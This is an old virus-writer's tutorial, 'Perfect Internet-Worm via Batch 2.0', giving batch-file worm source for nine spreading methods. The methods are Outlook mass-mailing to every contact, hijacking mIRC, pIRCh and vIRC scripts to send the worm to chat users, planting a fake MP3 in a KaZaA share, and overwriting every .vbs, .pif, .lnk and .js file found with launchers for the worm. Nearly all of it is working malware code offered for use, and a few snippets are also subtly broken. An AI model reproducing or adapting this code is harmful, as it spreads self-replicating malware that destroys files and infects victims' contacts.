Perfect Internet-Worm via Batch 2.0

In this article I'll show you some very successfull techiques for a batch internet worm. If you have any questions, contact me!

1.) eMail spreading
2.) mIRC spreading
3.) pIRCh spreading
4.) vIRC spreading
5.) KaZaA spreading
6.) VBS dropping
7.) PIF dropping
8.) LNK dropping
9.) JS dropping

1.) eMail spreading

First the source:

* * * * * * * * * * * * * * * * * * *
copy %0 C:\ATTACHMENT.bat
copy %0 C:\kvqim.vbs
echo Dim x > C:\kvqim.vbs
echo.on error resume next >> C:\kvqim.vbs
echo Set fso =" Scripting.FileSystem.Object" >> C:\kvqim.vbs
echo Set so=CreateObject(fso) >> C:\kvqim.vbs
echo Set ol=CreateObject("Outlook.Application") >> C:\kvqim.vbs
echo Set out=WScript.CreateObject("Outlook.Application") >> C:\kvqim.vbs
echo Set mapi = out.GetNameSpace("MAPI") >> C:\kvqim.vbs
echo Set a = mapi.AddressLists(1) >> C:\kvqim.vbs
echo Set ae=a.AddressEntries >> C:\kvqim.vbs
echo For x=1 To ae.Count >> C:\kvqim.vbs
echo Set ci=ol.CreateItem(0) >> C:\kvqim.vbs
echo Set Mail=ci >> C:\kvqim.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >> C:\kvqim.vbs
echo Mail.Subject="SUBJECT" >> C:\kvqim.vbs
echo Mail.Body="BODY" >> C:\kvqim.vbs
echo Mail.Attachments.Add("C:\ATTACHMENT.bat") >> C:\kvqim.vbs
echo Mail.Send >> C:\kvqim.vbs
echo Next >> C:\kvqim.vbs
echo ol.Quit >> C:\kvqim.vbs
cscript C:\kvqim.vbs
del C:\kvqim.vbs
del C:\ATTACHMENT.bat
* * * * * * * * * * * * * * * * * * *

This File make a VBS-file to send itself to all contacts in the MS-Outlook adressbookI think, it's not hard to understand...



+ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +  
2.) mIRC spreading

This virus infect the mIRC folder, if it exist. So the infect user send viruses to every user in the chatroom!

* * * * * * * * * * * * * * * * * * *
copy %0 C:\pro\ATTACHMENT.bat
if exist C:\mirc\script.ini set mIRC=C:\mirc
if exist C:\mirc32\script.ini set mIRC=C:\mirc32
if exist C:\progra~1\mirc\script.ini set mIRC=C:\progra~1\mirc
if exist C:\progra~1\mirc32\script.ini set mIRC=C:\progra~1\mirc32
copy file.bat %mIRC%\ATTACHMENT.bat
echo [script] > %mIRC%\script.ini
echo n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick %mIRC%\ATTACHMENT.bat } >>%mIRC%\script.ini
* * * * * * * * * * * * * * * * * * *

The virus search for a script.ini file in 4 standart-mIRC-paths. If it find the file, the variable "mIRC" will be the path it.
Then the virus overwrite the file with this file. If any mIRC user join to the infect users chatroom, this file will send a infect file to that user.
You can use "filesend" instead of "join" in the last line, but I thin, "join" is much better.


+ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +  
3.) pIRCh spreading

The source first:

* * * * * * * * * * * * * * * * * * *
copy %0 C:\Pirch98\ATTACHMENT.bat
echo [Levels] > C:\Pirch98\events.ini
echo Enabled=1 >> C:\Pirch98\events.ini
echo Count=6 >> C:\Pirch98\events.ini
echo Level1=000-Unknows >> C:\Pirch98\events.ini
echo 000-UnknowsEnabled=1 >> C:\Pirch98\events.ini
echo Level2=100-Level 100 >> C:\Pirch98\events.ini
echo 100-Level 100Enabled=1 >> C:\Pirch98\events.ini
echo Level3=200-Level 200 >> C:\Pirch98\events.ini
echo 200-Level 200Enabled=1 >> C:\Pirch98\events.ini
echo Level4=300-Level 300 >> C:\Pirch98\events.ini
echo 300-Level 300Enabled=1 >> C:\Pirch98\events.ini
echo Level5=400-Level 400 >> C:\Pirch98\events.ini
echo 400-Level 400Enabled=1 >> C:\Pirch98\events.ini
echo Level6=500-Level 500 >> C:\Pirch98\events.ini
echo 500-Level 500Enabled=1 >> C:\Pirch98\events.ini
echo [000-Unknowns] >> C:\Pirch98\events.ini
echo User1=*!*@* >> C:\Pirch98\events.ini
echo UserCount=1 >> C:\Pirch98\events.ini
echo Events1= ON JOIN:#: /dcc send $nick C:\Pirch98\ATTACHMENT.bat >> C:\Pirch98\events.ini
echo EventCount=1 >> C:\Pirch98\events.ini
echo [100-Level 100] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [200-Level 200] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [300-Level 300] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [400-Level 400] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [500-Level 500] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
* * * * * * * * * * * * * * * * * * *

It's the same as mIRC. The virus overwrite the event.ini file, and if any user join the infect user's chatroom, he will get a infect file.



+ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
4.) vIRC spreading

Source:

* * * * * * * * * * * * * * * * * * *
The source:
copy %0 C:\Virc\ATTACHMENT.bat
copy %0 xrwek.vbs
echo.on error resume next >xrwek.vbs
echo set ws = CreateObject("wscript.shell") >> xrwek.vbs
set vircA=MeGaLiTh
echo ws.regwrite "HKEY_USER\.Default\Software\MeGaLiTh Software\Visual IRC 96\Events\Event17","dcc send $nick C:\Virc\ATTACHMENT.bat " >>xrwek.vbs
cscript xrwek.vbs
del xrwek.vbs
* * * * * * * * * * * * * * * * * * *

The virus make a vbs file, to write a new registy key! Then it sends a infect file to all users in the room, not only the users, who is joining the room.



+ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
5.) KaZaA spreading

Source:

* * * * * * * * * * * * * * * * * * *
copy %0 C:\regkey.vbs
echo.on error resume next > C:\regkey.vbs
echo set ws = CreateObject("wscript.shell") >> C:\regkey.vbs
echo ws.regwrite "HKLM\Software\KaZaA\Transfer\DlDir0","%windir%\KaZaA\" >> C:\regkey.vbs
cscript C:\regkey.vbs
del C:\regkey.vbs
md %windir%\KaZaA
copy %MyS% %windir%\KaZaA\Nirvana - Lithium.mp3.bat
* * * * * * * * * * * * * * * * * * *

The virus makes a new direction, then copy itself to this dir.
Then make a Registry-Key.
I think, it's also really easy.



+ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
6.) VBS dropping

VBS dropping means, that every .VBS filethe virus can find, will be changed. If you open such a file, the file will open the virus.

* * * * * * * * * * * * * * * * * * *
copy %0 %windir%\yjdkt.bat
copy %0 %windir%\upoby.vbs
echo.on error resume next > %windir%\upoby.vbs
echo dim wshs >> %windir%\upoby.vbs
echo set wshs= wscript.createobject("wscript.shell") >> %windir%\upoby.vbs
echo wshs.run "%windir%\yjdkt.bat" >> %windir%\upoby.vbs
for %%q in (*.vbs \*.vbs ..\*.vbs %path%\*.vbs %windir%\*.vbs) do copy upoby.vbs %%q
del %windir%\upoby.vbs
* * * * * * * * * * * * * * * * * * *

The virus make a vbs file. If anybody open this file, it will open the virus.
Then the virus search in the current, parent, root, path and windir direction for vbs files and copy the infect one to them.
I think, it's easy but good!



+ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
7.) PIF dropping

The same as VBS dropping, but now the virus will infect all .PIF files

* * * * * * * * * * * * * * * * * * *
copy %0 %windir%\drop.vbs
copy %0 %windir%\xxseu.bat
echo dim wshs, msc > %windir%\drop.vbs
echo set wshs=Wscript.CreateObject("WScript.Shell") >> %windir%\drop.vbs
echo set msc=wshs.CreateShortcut("C:\pif.lnk") >> %windir%\drop.vbs
echo msc.TargetPath = wshs.ExpandEnvironmentStrings("%windir%\xxseu.bat") >> %windir%\drop.vbs
echo msc.WindowStyle = 4 >> %windir%\drop.vbs
echo msc.Save >> %windir%\drop.vbs
cscript %windir%\drop.vbs
del %windir%\drop.vbs
for %%k in (*.pif \*.pif ..\*.pif %path%\*.pif %windir%\*.pif) do copy C:\pif.pif %%k
del C:\pif.pif
* * * * * * * * * * * * * * * * * * *

The virus make a vbs file. This file generates a C:\pif.pif file. But why pif.pif, and not pif.lnk? 
The generated file opens the virus. This is a "dos"-virus, because of that it must be a .PIF file.
Is it understandable???
Than the same as .VBS dropping.



+ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
8.) LNK dropping

What do you need for LNK droping? a windows file? But the virus is no windows file! Is it a problem?
The answer is NO!
What to do? You use a VBS (windows-file) file, which opens the virus. Than the same as .PIF dropping.

* * * * * * * * * * * * * * * * * * *
copy y.bat %windir%\dropa.vbs
copy y.bat %windir%\mzxfv.bat
copy y.bat %windir%\dropb.vbs
echo.on error resume next >%windir%\dropb.vbs
echo dim wshs >>%windir%\dropb.vbs
echo set wshs=wscript.createobject("wscript.shell") >>%windir%\dropb.vbs
echo wshs.run "%windir%\mzxfv.bat" >>%windir%\dropb.vbs
echo dim wshs, msc > %windir%\dropa.vbs
echo set wshs=Wscript.CreateObject("WScript.Shell") >> %windir%\dropa.vbs
echo set msc=wshs.CreateShortcut("C:\vbs.lnk") >> %windir%\dropa.vbs
echo msc.TargetPath = wshs.ExpandEnvironmentStrings("%windir%\dropb.vbs ") >> %windir%\dropa.vbs
echo msc.WindowStyle = 4 >> %windir%\dropa.vbs
echo msc.Save >> %windir%\dropa.vbs
cscript %windir%\dropa.vbs
del %windir%\dropa.vbs
for %%k in (*.lnk \*.lnk ..\*.lnk %path%\*.lnk %windir%\*.lnk) do copy C:\vbs.lnk %%k
* * * * * * * * * * * * * * * * * * *

I think, you will understand it!!!



+ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
9.) JS dropping

It's the same as VBS-dropping:

* * * * * * * * * * * * * * * * * * *
copy %0 %windir%\uatvs.bat
echo { >> %windir%\snphh.js
echo shell=WScript.CreateObject("WScript.Shell"; >> %windir%\snphh.js
echo shell.Run("%windir%\uatvs.bat"); >> %windir%\snphh.js
echo } >> %windir%\snphh.js
for %%j in (*.js \*.js ..\*.js %path%\*.js %windir%\*.js) do copy snphh.js %%j
del %windir%\snphh.js
* * * * * * * * * * * * * * * * * * *

First copy the file to the windows-dir.
Then make a JS-file, that opens the virus in the windows-direction.
Then copy the JS-file to every existing JS-file
OK, it's easy...



+ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +





I hope, you understood all the source and i could help you!

greets,
SeCoNd PaRt To HeLl
www.spth.de.vu
spth@jet2web.cc